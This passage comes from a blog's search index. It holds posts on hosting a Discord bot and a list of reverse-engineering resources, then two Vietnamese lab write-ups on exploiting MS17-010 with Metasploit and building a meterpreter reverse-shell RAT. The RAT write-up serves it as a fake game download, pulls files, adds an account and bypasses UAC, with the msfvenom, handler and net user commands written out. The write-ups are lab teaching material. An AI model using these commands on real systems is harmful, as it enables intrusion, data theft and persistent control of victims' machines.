install libs). specific to CTF without error). So if you can host a Bot on your computer, you can also host it on Replit\nHosting Bot is extremely easy by just putting the last 2 python files onto Replit and running it\nAfter Run on Replit, you can run the Bot normally, but there is a disadvantage of Replit: after 5 minutes, if no user accesses and uses it, it will automatically shut down, that\u0026rsquo;s why we Need more tools to be able to ping Bot continuously\nKeep Bot \u0026ldquo;awake\u0026rdquo; with Uptime RoBot Uptime RoBot through the keep_alive.py file set up above helps check if the Bot is active and will ping it to replit to revive it so that it can be revived. Hang Bot 24/7 without fear of death.\nExample with uptime statistics of my old Bot (Since 2710 hrs, 23 mins (2023-06-09 17:46:19))\nTutorial: Select + Monitor to create a new Monitor In Monitor Information \u0026ndash;\u0026gt; Monitor Type select HTTP(s) Name and add the URL of Project Replit (it will look like https://.repl.co) Set Monitoring Interval to every 5 minutes (in accordance with Replit) Select Create Monitor and the setup is complete Uptime RoBot will now have the task of pinging the Bot every 5 minutes, which is a lot of fun (unless you force it to do too much work with a free tool :3)\nConclusion This article was posted because my Bot was reported, forcing me to re-create a new Bot, so I\u0026rsquo;ll have to read it again later\nRemember to always respect Discord\u0026rsquo;s Terms of Service when running a bot so you don\u0026rsquo;t get banned like me\n","date":"2022-01-30T00:00:00Z","image":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/featured_hud00ea637fa08c187ca2cd6f368360648_31275_120x120_fill_box_smart1_3.png","permalink":"/p/build-bot-discord-24/7-with-replit-and-uptime-robot-python/","title":"Build Bot Discord 24/7 with Replit and Uptime RoBot (Python)"},{"content":"Thanks to Mr. Rc (HACKE-RC) for sharing knowledge about Reverse Engineering!\nReverse Engineering Resources Highest quality resources to learn Reverse Engineering from start to end! Roadmap\nAssembly Linux specific https://asmtutor.com https://www.plantation-productions.com/Webster/www.artofasm.com/Linux/index.html Windows specific https://www.plantation-productions.com/Webster/www.artofasm.com/Windows/index.html https://sonictk.github.io/asm_tutorial/ Miscellaneous Learn how CPUs work https://www.felixcloutier.com/x86/index.html https://cs.lmu.edu/~ray/notes/x86assembly/ https://godbolt.org https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/about Assembly Projects After learning assembly, you can try some projects like making a bootloader or a whole simple Operating System. I have wrote a blog on this topic, here.\nhttp://brokenthorn.com/Resources/OSDev1.html https://raw.githubusercontent.com/tuhdo/os01/master/Operating_Systems_From_0_to_1.pdf https://cs.bham.ac.uk/~exr/lectures/opsys/10_11/lectures/os-dev.pdf Operating System Internals https://www.youtube.com/playlist?list=PLmbPuZ0NsyGS8ef6zaHd2qYylzsHxL63x https://www.youtube.com/playlist?list=PLgre7dUq8DGKbtnlMuJPvPYlvLdXOC9uh https://pages.cs.wisc.edu/~remzi/OSTEP/ Getting started Roadmap for RE COMPSCI 390R - Reverse Engineering \u0026amp; Vulnerability Analysis https://www.begin.re https://artik.blue/reversing https://legend.octopuslabs.io/sample-page.html https://www.youtube.com/watch?v=mDyQBM-_T1g https://www.youtube.com/watch?v=gPsYkV7-yJk https://www.youtube.com/watch?v=d4Pgi5XML8E https://www.youtube.com/watch?v=9vKG8-TnawY (Recommended) Getting your hands dirty https://crackmes.one http://reversing.kr/challenge.php https://github.com/Maijin/radare2-workshop-2015/tree/master/IOLI-crackme http://reversing.kr/challenge.php https://0x00sec.org/t/challenge-collection-reverse-engineering-and-crackme/3027 Youtube playlist on Malware Analysis Binary Analysis Free Course Deobfuscation https://www.vadesecure.com/en/blog/malware-analysis-understanding-code-obfuscation-techniques https://www.youtube.com/watch?v=bEsQ8UYioU4 https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847 https://www.blackhat.com/presentations/bh-usa-07/Yason/Whitepaper/bh-usa-07-yason-WP.pdf https://www.varonis.com/blog/x64dbg-unpack-malware https://apr4h.github.io/2021-05-01-Manually-Unpacking-Remcos-Malware/ https://www.youtube.com/watch?v=EdchPEHnohw https://www.youtube.com/playlist?list=PLynb9SXC4yER8NinXJwV4GHUM9-jaIsN_ Anti-debug and Anti-analysis https://iopscience.iop.org/article/10.1088/1742-6596/1744/4/042186/pdf https://wikileaks.org/vault7/document/2015-07-PoC-Anti_Debugging_and_Anti_Emulation/2015-07-PoC-Anti_Debugging_and_Anti_Emulation.pdf https://anti-reversing.com/Downloads/Anti-Reversing/The_Ultimate_Anti-Reversing_Reference.pdf https://anti-debug.checkpoint.com/ https://www.youtube.com/watch?v=WlE8abc8V-4\u0026amp;feature=emb_title Anti-analysis https://www.malwarebytes.com/blog/news/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts https://www.oic-cert.org/en/download/Anti-Analysis techniques (OIC Talk).pdf https://www.cynet.com/attack-techniques-hands-on/malware-anti-vm-techniques/ https://www.youtube.com/watch?v=5NO-W3SVjak\u0026amp;feature=emb_title C++ Reversing Reversing C++ Virtual Functions Reversing C++ Windows Research If you want to get into Windows Research, then you need to learn Windows Internals.\nMy blog on Windows Internals Book on Windows Internals published by MS. Use it like a reference to learn about specific topics when needed Has the best video courses Windows Process Internals Windows Internals Overview Intro to Windows Internals Win32 programming with code examples Notes for Windows API programming Windows undocumented functions documentation Windows undocumented stuff\u0026rsquo;s documentation Windows Internals Book 7th edition Tools Full source code of ReactOS (open-source reimplementation of Windows) Explanation of key data structures used by device drivers, kernel, and HAL Take a look at more than 6000 Windows Undocumented structures Resources For Advanced Windows Development Understanding the EPROCESS data structure The NT Handle Table Anatomy of the thread suspension mechanism in Windows. Automatically generated diff of Windows structures Thread Scheduling Windows Kernel Callback Functions Decompilation of NT API functions Great blogs on Windows Internals https://secret.club wumb0.in voidsec.com https://poppopret.blogspot.com/?m=1 https://www.ragestorm.net/blogs/?cat=13 https://www.x86matthew.com https://www.tiraniddo.dev https://googleprojectzero.blogspot.com Others GuidedHacking Compiler Optimizations for Reverse Engineers. Reversing Stories: Updating the Undocumented ESTROBJ and STROBJ Structures for Windows 10 x64. Methodology for Static Reverse Engineering of Windows Kernel Drivers. What I Have Learned from Reverse Engineering Windows Containers. A Syscall Journey in the Windows Kernel. Symbolic Execution Video lecture on Symbolic Execution by MIT Video lectures on Symbolic Execution Youtube video covering the basics of z3 Learn z3 Course on Symbolic Analysis https://sat-smt.codes/SAT_SMT_by_example.pdf ","date":"2021-12-18T00:00:00Z","image":"/p/awesome-reverse-engineering/featured_huf18555801dbebbc9e5901ff2416a53a7_1886454_120x120_fill_box_smart1_3.png","permalink":"/p/awesome-reverse-engineering/","title":"Awesome Reverse Engineering"},{"content":"Tìm hiểu và thực hành tấn công với lỗ hổng MS17-010 (CVE-2017-0143)\nPhát hiện lỗ hổng MS17-010 1 2 Attacker: Kali Linux (192.168.47.128) Victim: Windows 7 (192.168.47.136) Trên máy victim ping tới IP attacker (192.168.47.128) và tương tự trên máy attacker cũng ping tới IP victim (192.168.47.136)\nTrên máy Attacker, sử dụng lệnh sudo nmap -sV -sC -O 192.168.47.136 để check các port đang mở trên máy victim cũng như dịch vụ và script trên các port này\nTại đây thấy port 445 đang mở (cổng 445 được dùng cho dịch vụ Server Message Block - smb truyền qua TCP)\nHoàn toàn có thể thấy script result bao gồm smb-os-discovery\n\u0026ndash;\u0026gt; Scan lỗ hổng trên giao thứ smb (tại port 445) bằng nmap: nmap --script vuln -p 445 192.168.47.136\nHoặc có thể sử dụng lệnh nmap -vv -Pn -T4 --script vuln 192.168.47.136 để quét full các cổng đang mở luôn cũng được\n(T: tượng trưng cho tốc độ quét \u0026ndash;\u0026gt; có 6 mốc quét từ 0 đến 5\n1 paranoid; sneaky; polite, nomal, aggressive, insane \u0026ndash;\u0026gt; tốc độ càng thấp độ an toàn càng cao, mức 3 sẽ là bthg, thi CTF dùng mức 4, thực tế dùng mức 1 (tránh bị hệ thống IDS phát hiện))\nIDS: Instrusion Detection System (Hệ thống phát hiện xâm nhập)\nTừ những dữ liệu trên, ta hoàn toàn có thể xác định được tồn tại lỗ hổng bảo mật MS17-010\nKhai thác lỗ hổng bảo mật MS17-010 Thực hiện truy cập vào máy victim Thực hiện mở Metasploit Framework và search ms17 để tìm các module liên quan\nexploit/windows/smb/ms17_010_eternalblue\nSau khi set module và rhost (remote), run để thiết lập SMB\nuse 0 \u0026ndash;\u0026gt; set rhost 192.168.47.136 (remote) \u0026ndash;\u0026gt; run\nĐến đây là đã khai thác thành công lỗ hổng MS17-010 để truy cập vào máy victim\nTruyền RAT Cách tạo ra 1 phần mềm RAT thì không khác gì như bài RAT (Remote Access Trojan) gì lắm, chỉ cần để ý hệ điêu hành chúng ta sử dụng làm victim trong chủ đề này là Windows 7 (x64) thì chúng ta cần tạo ra 1 file RAT tương ứng x64\nmsfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=192.168.199.139 lport=4444 -f exe --platform window \u0026gt; mal.exe Truyền RAT qua máy victim bằng lệnh upload + file\nSử dụng lệnh execute -f mal.exe -i -H để chạy file trên máy victim\nhoặc có thể truy cập vào shell và gọi file để chạy\nCheck trong Task Manager để thấy file mal.exe đang chạy\nKết luận Lỗ hổng bảo mật MS17-010 (CVE-2017-010) được đánh giá ở mức độ Critical (Nguy kịch) vì hoàn toàn có thể thực thi từ xa\nHệ điều hành bị ảnh hưởng bởi lỗ hổng bảo mật MS17-010 Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows 8.1, Windows Server 2012, 2012 R2, Windows RT 8.1, Windows 10, Windows Server 2016\n","date":"2021-12-12T00:00:00Z","image":"/p/ms17-010-cve-2017-0143/featured-image_hu69e7e51dfaf03e795a7783d1f5e83771_247169_120x120_fill_box_smart1_3.png","permalink":"/p/ms17-010-cve-2017-0143/","title":"MS17-010 (CVE-2017-0143)"},{"content":"Tìm hiểu và thực hành tấn công với Remote Access Trojan\nRAT là gì? RAT (Remote Access Trojan) là một loại phần mềm độc hại có thể giúp 1 tin tặc có thể chiếm quyền vào các điện thoại hoặc máy tính khi bị lây nhiễm.\nRAT được sử dụng hầu hết cho việc hack của các tin tặc và được cài trên máy của nạn nhân (victim). Nếu được mã hoá thì RAT sẽ được ẩn đi và rất khó cho các phần mềm diệt virus phát hiện được chúng. Bởi vì vậy càng khiến việc loại bỏ trở nên khó khăn cũng như các tin tặc dễ dàng kiểm soát thiết bị của nạn nhân hơn.\nCác phần mềm RAT nguy hiểm ở chỗ, hiện nay nó đang được rao bán với tầm giá từ vài chục đến vài trăm đô la mỹ nên việc xử lý chúng trên diện rộng cũng trở nên khó khăn hơn.\nKhi nạn nhân bị nhiễm RAT, tin tặc có thể làm được gì? Lấy được toàn bộ dữ liệu (Data), password lưu trên máy của nạn nhân Truy cập camera (webcam), hiển thị vị trí, truy cập mic để nghe môi trường xung quanh, xem trực tiếp màn hình của nạn nhân (victim) Có quyền truy cập danh bạ, danh sách cuộc gọi hoặc tin nhắn Có thể cài thêm các virus (có thể là loại khác vào máy nạn nhân) Có thể lợi dụng quyền điều khiển máy của nạn nhân để thực hiện các hành vi phạm tội khác \u0026ndash;\u0026gt; Tất cả các quyền của nạn nhân làm được trên thiết bị của họ, tin tặc cũng đều có thể làm được với máy của họ (nạn nhân)\nYêu cầu mô phỏng Sử dụng 1 công cụ RAT (Remote Access Trojan) bất kì [Mô hình bao gồm 1 máy attacker và 1 máy victim]. Thực hiện cài đặt RAT vào máy tính victim sau đó thực hiện các hành vi:\nLấy file dữ liệu về (có thể dùng 1 file giả lập trong hệ thống) Tạo tài khoản người dùng có quyền administrator Lưu ý: Sử dụng giao diện dòng lệnh hoặc giao diện của công cụ RAT (lưu ý không sử dụng công cụ Remote Desktop hoặc SSH) Thực hiện mô phỏng Mô hình tấn công Bao gồm 1 máy attacker là Kali Linux và 1 máy victim (trong bài này mình sử dụng Windows XP và Windows 7)\nCông cụ RAT Chọn công cụ msfvenom (Metasploit Framework) để sử dụng cho việc tấn công mô phỏng này\nStart apache web server từ phía Kali Linux (attacker) bằng sudo apache2ctl start và tiếp theo là check IP từ Kali Linux\nVà những gì hiển thị trên IP này là toàn bộ dữ liệu có trong var/www/html bên phía Kali Linux, mình đã tạo 1 web giả mạo tải game\nTạo 1 payload và lưu vào file game.exe mà mình sẽ dùng bằng lệnh (Tạo file malware)\n1 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.47.128 lport=443 -f exe -o game.exe Giải thích shell:\n-p là sử dụng payload windows/meterpreter/reverse_tcp\nlhost là IP address của máy attacker (l tượng trưng cho local)\nlport là cổng của máy attacker\n-f là format của file malware (ở đây mình để là exe)\n-o File output thực tế (mình để tên của file)\nTại đây dùng 1 máy Windows XP để làm máy victim và truy cập vào địa chỉ IP trên đã lấy từ Kali Linux ở trên tiến hành truy cập vào apache web server và vào mục game đã chứa web giả mạo của mình. Và sau khi tải về thì sẽ chứa file game.exe\nSử dụng giao diện của msf \u0026ndash;\u0026gt; msfconsole (Metasploit framework) và vào việc\nNhập lần lượt các dòng lệnh để cài đặt cho msf\n1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.47.128 set lport 443 run Các lệnh cài cho Metasploit\nVà sau khi máy victim chạy nó, msf sẽ tự hiện lên kết nối\nNhập help để biết thêm nhiều lệnh và công dụng trong đó (mình không để ý nên đã mất rất nhiều thời gian sử dụng shell bên victim để gửi tài liệu)\nThực hiện hành vi 1: Lấy file tài liệu về (một file giả lập bất kỳ trong hệ thống)\nGiả sử máy victim đang có 1 file txt chẳng hạn ở đây mình để là file dinhthaison.txt và mình để luôn ở Desktop cho nhanh nhé\nthì với lệnh dir, mình đã quét được các file đang tồn tại ngoài Desktop và có tồn tại file dinhthaison.txt\nSau đó chỉ cần nhập lệnh download dinhthaison.txt để tải về thôi\nThực hiện hành vi 2: Tạo 1 tài khoản người dùng có quyền administrator.\nSử dụng lệnh shell để truy cập vào cmd của máy victim, check user bằng lệnh net user, ở đây ta thấy mới có tài khoản ban đầu của máy là SUPPORT_388945a0\nTiến hành thêm tài khoản mới bằng cách nhập lệnh net user newaccount dinhthaison /add, trong đó newaccount là tên người dùng, còn dinhthaison là password\nNgoài lề Về RAT lần này, sau khi thử với windows 7 thì có trường hợp không được cấp quyền ad trong khi nhập meterpreter (và lý do chính là UAC chưa được bypass)\nNhưng khi mình thực thi thì hoàn toàn không gặp phải vấn đề này vì có lẽ windows XP không có UAC\nNếu gặp UAC từ các đời windows 7 trở lên thì sao? Vậy thì mình sẽ bypass UAC ngay trong máy attacker. Đầu tiên sẽ là check người dùng bằng getuid\nVới mỗi thông tin nhu này thì chưa chắc chắn được gì, có lẽ nên thử tiếp bằng getsystem\nVậy là đã bị fail. Sử dụng getsystem -h để hiển thị mục help\nSau khi sử dụng getsystem -t 1 trả về Access is denied\nVậy thì sẽ tiến hành bypass UAC để có quyền truy cập cho RAT, bằng cách sử dụng module từ Metasploit để bypass tính năng UAC trên Windows.\nĐầu tiên thì mình sẽ cần làm background cho session\nTiếp theo sẽ sử dụng lệnh use exploit/windows/local/bypassuac (lệnh này có thể tìm kiếm bằng việc search uac trong Metasploit) sau đó check options\nDễ thấy exploit target là windows x86 \u0026ndash;\u0026gt; nhập show targets để xem những mục tiêu\nVậy thì đến đây chúng ta sẽ set target cũng như session\nSau bước này chúng ta có thể run để bypass UAC\nSau khi check getuid và getsystem đều đã ra những thứ chúng ta cần\nVậy là đã thành công vượt qua được UAC và đã có quyền truy cập hệ thống\n\u0026ndash;\u0026gt; Hoàn thành challenge tìm hiểu và sử dụng RAT (Remote Access Trojan)\nCách phòng tránh RAT và tự bảo vệ chính mình trước RAT Không sử dụng các phần mềm Crack hoặc không download từ 1 nguồn không đáng tin cậy nào Không mở mail không xác định hoặc mở file đính kèm từ 1 mail không xác định Luôn cập nhật các bản vá hoặc phần mềm mới nhất từ trang chính thức của phần mềm đó (cũng như hệ điều hành) Thao tác các hành động không đáng tin cậy trên máy ảo Về Windows đời cao hơn Đối với hệ điều hành Windows đời cao hơn, sẽ cần phải tắt tưởng lửa, window defender và tất nhiên cũng sẽ phải bypass UAC mới có thể sử dụng được và sự mô phỏng này có lẽ chưa thực sự khả thi với ngoài đời trong thời điểm hiện tại.\n","date":"2021-12-08T00:00:00Z","image":"/p/remote-access-trojan-rat/featured-image_hu5d81229f77d95ff6b8ef09734888b519_23752_120x120_fill_box_smart1_3.png","permalink":"/p/remote-access-trojan-rat/","title":"Remote Access Trojan (RAT)"}]